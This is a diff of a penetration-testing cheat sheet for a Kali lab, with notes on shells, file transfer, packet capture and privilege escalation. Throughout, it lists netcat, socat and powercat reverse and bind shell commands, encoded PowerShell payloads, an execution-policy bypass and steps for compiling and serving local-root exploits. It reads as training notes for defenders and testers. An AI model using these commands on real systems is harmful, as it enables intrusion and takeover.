@@ -4,33 +4,33 @@ Pentesting with Kali
 # Environment Variables
 
 echo $PATH
-echo $USER                                             Current user
-echo $HOME                                             Home directory
-echo $PWD                                              Present working directory
+echo $USER                                                  Current user
+echo $HOME                                                  Home directory
+echo $PWD                                                   Present working directory
 
-export t=192.168.1.10                                  Set the target IP as a variable
+export t=192.168.1.10                                       Set the target IP as a variable
 nmap $t
 
-env                                                    Environment variables
+env                                                         Environment variables
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Bash
 
-history                                                List commands that have been entered into the shell
-!<command number>                                      Re-run a specific command
-!802                                                   Re-run command 802
+history                                                     List commands that have been entered into the shell
+!<command number>                                           Re-run a specific command
+!802                                                        Re-run command 802
 
-$HISTSIZE                                              Controls the number of commands stored for the current session
-$HISTFILESIZE                                          How many command are kept in the .bash_history file
+$HISTSIZE                                                   Controls the number of commands stored for the current session
+$HISTFILESIZE                                               How many command are kept in the .bash_history file
 
-<up arrow>                                             Scrolls back in history
-<down arrow>                                           Scrolls forward in history
-<ctrl+r>  <letter>                                     Reverse i search facility
+<up arrow>                                                  Scrolls back in history
+<down arrow>                                                Scrolls forward in history
+<ctrl+r> <letter>                                           Reverse i search facility
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-standard input    (STDIN)    0                         Data fed into the program
-standard output   (STDOUT)   1                         Output from the program (deafult to terminal)
-standard error    (STDERR)   2                         Error messages (defaults to terminal)
+standard input    (STDIN)    0                              Data fed into the program
+standard output   (STDOUT)   1                              Output from the program (deafult to terminal)
+standard error    (STDERR)   2                              Error messages (defaults to terminal)
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Text Searching & Manipulation
@@ -40,101 +40,160 @@ See discover/notes/bash.sh
 
 # Netcat
 
-Kali                  192.168.1.5
-Target                192.168.1.10
+Kali                    192.168.1.5
+Windows                 192.168.1.10
 
 - Interact with a service
-Kali                  nc -nv 192.168.1.10 110
+Kali                    nc -nv 192.168.1.10 110
 
 - Chat
-Target                nc -nlvp 4444
-Kali                  nc -nv 192.168.1.10 4444
+Kali                    nc -nv 192.168.1.10 4444
+Windows                 nc.exe -nlvp 4444
 
 - Transfer a file
-Kali                  nc -nv 192.168.1.10 < /usr/share/windows-binaries/wget.exe
-Target                nc -nlvp 4444 > incoming.exe     Notice there is no output in the terminal
+Kali                    nc -nv 192.168.1.10 4444 < /usr/share/windows-binaries/wget.exe
+Windows                 nc.exe -nlvp 4444 > wget.exe
+There is no output letting you know when the transfer is complete
 
 - Bind shell
-Kali                  nc -nv 192.168.1.10 4444
-Target                nc -nlvp 4444 -e cmd.exe
+Kali                    nc -nv 192.168.1.10 4444
+Windows                 nc.exe -nlvp 4444 -e cmd.exe
+Kali                    You will see a Windows prompt
 
 - Reverse shell
-Target                nc -nlvp 4444
-Kali                  nc -nv 192.168.1.10 4444 -e /bin/bash
+Windows                 nc.exe -nlvp 4444
+Kali                    nc -nv 192.168.1.10 4444 -e /bin/bash
+Windows                 You will not see a Linux prompt
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Socat
 
+https://github.com/tech128/socat-2.0.0-b8-windows
+
 - Interact with a service
-Kali                  socat - TCP4:192.168.1.10:110
+Kali                    socat - TCP4:192.168.1.10:110
 
 - Chat
-Target                socat - TCP4:192.168.1.5
-Kali                  socat TCP4-LISTEN:443 STDOUT
+Kali                    socat TCP4-LISTEN:443 -
+Windows                 socat.exe - TCP4:192.168.1.5:443
 
 - Transfer a file
-Kali                  socat TCP4-LISTEN:443,fork file:names.txt
-Target                socat TCP4:192.168.1.5:443 file:file-received.txt,create
+Kali                    socat TCP4-LISTEN:443,fork file:names.txt
+Windows                 socat.exe TCP4:192.168.1.5:443 file:file-received.txt,create
 
 - Reverse shell
-Target                socat -d -d TCP4-LISTEN:443 STDOUT
-Kali                  socat TCP4:192.168.1.10:443 EXEC:/bin/bash
+Windows                 socat.exe -d -d TCP4-LISTEN:443 -
+Kali                    socat TCP4:192.168.1.10:443 EXEC:/bin/bash
+Windows                 You will not see a Linux prompt
 
 - Encrypted bind shell
-Kali                  openssl req -newkey rse:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
-                      cat bind_shell.key bind_shell.crt > bind_shell.pem
-                      socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verfy=0,fork EXEC:/bin/bash
-Target                socat - OPENSSL:192.168.1.5:443,verfy=0
+Kali                    openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
+                        cat bind_shell.key bind_shell.crt > bind_shell.pem
+                        socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+Windows                 socat.exe - OPENSSL:192.168.1.5:443,verify=0
+                        You will not see a Linux prompt
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# TFTP
+# PowerShell
 
-mkdir /tftp                                            Create a new home folder for tftp
-atftpd --daemon --port 69 /tftp                        Start tftp and assign home folder
-netstat -anup | grep atftp                             Verify the service is running
-cp /usr/share/windows-binaries/nc.exe /tftp/
-tftp -i 192.168.1.5 get nc.exe                       Run from Windows
+- Policy
+Right click on the Start button > Command Prompt (Admin) > Yes
+Set-ExecutionPolicy Unrestricted
+Y
+Get-ExecutionPolicy     Validate the policy
+
+- File transfer
+Kali                    cp /usr/share/windows-resources/binaries/wget.exe /var/www/html/
+                        service apache2 start
+Windows                 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.1.5/wget.exe','C:\Users\lee\Desktop\wget.exe')"
+
+- Reverse shell
+Kali                    nc -nlvp 443
+Windows                 (big blog of code)
+
+- Bind shell
+Windows                 (big blog of code)
+Kali                    nc -nv 192.168.1.11 443
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Powercat (Windows Defender detects as malware and deletes)
+
+-Windows
+https://github.com/besimorhino/powercat
+powershell.exe -nop -exec bypass                            Start PowerShell and bypass the execution policy
+Import-Module .\powercat.ps1
+powercat -h                                                 Show the help
+
+- File transfer
+Kali                    nc -nlvp 443 > receiving_powercat.ps1
+Windows                 powercat -c 192.168.1.5 -p 443 -i C:\Users\Lee\Desktop\powercat.ps1
+Kali                    Kill nc and see if the file has been received
+
+- Reverse shell
+Kali                    nc -nlvp 443
+Windows                 powercat -c 192.168.1.5 -p 443 -e cmd.exe
+
+- Bind shell
+Windows                 powercat -l -p 443 -e cmd.exe
+Kali                    nc -nv 192.168.1.10 443
+
+- Stand alone payload
+Kali                    nc -nlvp 443
+Windows                 powercat -c 192.168.1.5 -p 443 -e cmd.exe -g > reverseshell.ps1
+                        .\reverseshell.ps1
+
+- Stand alone encoded payload
+Kali                    nc -nlvp 443
+Windows                 powercat -c 192.168.1.5 -p 443 -e cmd.exe -ge > encoded-reverseshell.ps1
+                        notepad .\encoded-reverseshell.ps1
+                        Select all the text
+                        powershell.exe -E <paste>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Wireshark
 
-Capture > Interfaces > choose your interface.
-To filter out unwanted traffic choose Options.
-Create a capture filter to only listen for traffic on the Windows box on TCP port 4444.
-     host 192.168.1.10 and tcp port 4444
-     Start
+Filter: net <CIDR>                                          Filter on traffic from a particular subnet
+Select the interface to use
 
-Now generate some traffic with netcat.
+- Display filter
+tcp.port == 21                                              Narrow down the background traffic, focus on only the FTP protocol
 
-Go to Wireshark and hit Stop.
-Right click on any packet > Follow TCP Stream. You should be able to see clear text.
+- Following TCP streams
+Right click on a packet > Follow > TCP Stream               Much easier to read
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # tcpdump
 
-tcpdump -r <capture.pcap>                              Read the file
-tcpdump -n src host 192.168.1.5 -r <capture.pcap>      Specify a source
-tcpdump -n dst host 192.168.1.10 -r <capture.pcap>     Specify a destination
-tcpdump -n port 443 -r <capture.pcap>                  Specify a port
-tcpdump -nX -r <capture.pcap>                          Read the file and dump in hex format
+tcpdump -r <capture.pcap>                                   Read a file
+
+- Filtering traffic
+tcpdump -n -r <capture.pcap> | awk '{print $3}' | sort | uniq -c | head
+tcpdump -n src host <target IP> -r <capture.pcap>           Specify a source
+tcpdump -n dst host <target IP> -r <capture.pcap>           Specify a destination
+tcpdump -n port <port> -r <capture.pcap>                    Specify a port
+tcpdump -nX -r <capture.pcap>                               Read a file and dump in hex and ASCII format
+
+- Advanced header filtering
+To better inspect the requests and responses, we need to filter out and display only the data packets
+tcpdump -A -n 'tcp[13] = 24' -r <capture.pcap>              Look for packets with only the ACK and PSH flags turned on
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Google Hacking
 
-site:target.com                                        Approximate web presence of an organization
-site:target.com -site:www.target.com                   Locate Subdomains
-filetype:pdf					                    Locate all pdf files
+site:target.com                                             Approximate web presence of an organization
+site:target.com -site:www.target.com                        Locate Subdomains
+filetype:pdf					                         Locate all pdf files
 intitle:
 inurl:
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # DNS
 
-host -t <type> target.com			     	     Enumeration
+host -t <type> target.com			     	          Enumeration
     mx = mail server
     ns = name server
 
-host -l target.com <DNS server>				     Zone transfer
+host -l target.com <DNS server>				          Zone transfer
 
 # debug.exe
 
@@ -147,15 +206,15 @@ wine exe2bat.exe nc.exe nc.txt
 # Local Privilege Escalation - Linux
 
 ssh user@192.168.1.10
-id                                                     Show user/group permissions
-cat /etc/shadow                                        Access denied
-/etc/issue                                             OS info
-uname -a                                               Kernel info
+id                                                          Show user/group permissions
+cat /etc/shadow                                             Access denied
+/etc/issue                                                  OS info
+uname -a                                                    Kernel info
 
 wget -O exploit.c http://www.exploit-db.com/download/18411
-gcc -o exploit exploit.c                               Compile exploit
-./exploit                                              Run exploit
-id                                                     Show user/group permissions
+gcc -o exploit exploit.c                                    Compile exploit
+./exploit                                                   Run exploit
+id                                                          Show user/group permissions
 cat /etc/shadow
 
 Option 2 - using Kali
@@ -163,10 +222,10 @@ searchsploit linux local root
 Mempodipper - Linux Local Root => 2.6.39 (32-bit & 64-bit)                /linux/local/18411.c
 cp /usr/share/exploitdb/platforms/linux/local/18411.c /tmp/
 cd /tmp/
-gcc -o exploit 18411.c                                 Compile exploit
-service apache2 start                                  Start apache
-netstat -antp | grep apache                            Verify the service is running
-cp /tmp/exploit /var/www/                              Copy the exploit to the web root
+gcc -o exploit 18411.c                                      Compile exploit
+service apache2 start                                       Start apache
+netstat -antp | grep apache                                 Verify the service is running
+cp /tmp/exploit /var/www/                                   Copy the exploit to the web root
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Local Privilege Escaltion - Windows XP, 2003
@@ -176,9 +235,9 @@ cp /usr/share/exploitdb/platforms/windows/local/18176.py /tmp/
 cd /usr/share/pyinstaller/ 
 pyinstaller -F -n evil.exe /tmp/18176.py
 cp evil.exe/dist/evil.exe /tmp/
-service apache2 start                                  Start apache
-netstat -antp | grep apache                            Verify the service is running
-cp /tmp/evil.exe /var/www/                             Copy the exploit to the web root
+service apache2 start                                       Start apache
+netstat -antp | grep apache                                 Verify the service is running
+cp /tmp/evil.exe /var/www/                                  Copy the exploit to the web root
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Weak Services - Windows
@@ -189,7 +248,7 @@ services.msc
 Find the service > RC > Properties
 Note the path to executable
 cd to that directory
-icacls vulnapp.exe                                     Misconfigured if the Everyone group has access
+icacls vulnapp.exe                                          Misconfigured if the Everyone group has access
 
 - Kali
 cat adduser.c
@@ -201,7 +260,7 @@ int main ()
     return 0;
 }
 
-i586-mingw32msvc-gcc adduser.c -o adduser.exe          Cross compile code
+i586-mingw32msvc-gcc adduser.c -o adduser.exe               Cross compile code
 file adduser.exe
 mv adduser.exe /var/www/
 
@@ -218,7 +277,7 @@ The account with Users privs should how have Admin privs
 
 # Weak Services
 
-find / -perm -2 ! -type l -ls 2>/dev/null              Search for WORLD writable files. 
+find / -perm -2 ! -type l -ls 2>/dev/null                   Search for WORLD writable files.
 
 Look for any cron jobs that are WORLD writable running at root.
 nano /etc/cron.hourly/test.sh
@@ -240,7 +299,7 @@ service apache2 start
 
 - Windows
 Open IE to <kali-ip>/exploit.html
-netstat -an:find “4444”                                Look for a bind shell
+netstat -an:find “4444”                                     Look for a bind shell
 
 - Kali
 nc -v 192.168.1.10 4444
@@ -257,4 +316,5 @@ nc -lvp 443
 
 - Windows
 Open IE to 192.168.1.5/exploit.html
+nc -nv 192.168.1.11 443
 
